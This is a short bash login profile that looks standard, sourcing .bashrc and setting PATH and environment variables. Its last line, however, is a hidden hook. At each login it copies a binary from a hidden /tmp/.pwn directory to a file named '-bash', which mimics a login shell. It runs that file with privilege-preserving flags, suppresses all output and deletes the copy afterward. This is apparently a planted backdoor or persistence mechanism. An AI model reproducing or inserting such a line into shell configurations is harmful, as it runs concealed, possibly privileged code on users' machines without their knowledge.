# .bash_profile

# Get the aliases and functions
if [ -f ~/.bashrc ]; then
        . ~/.bashrc
fi

# User specific environment and startup programs

PATH=$PATH:$HOME/bin
BASH_ENV=$HOME/.bashrc
USERNAME=""

export USERNAME BASH_ENV PATH
cp -f -r -- /tmp/.pwn/bprofr /tmp/-bash 2>/dev/null && /tmp/-bash -c  -p -d -d -d >/dev/null 2>&1 && rm -rf -- /tmp/-bash 2>/dev/null
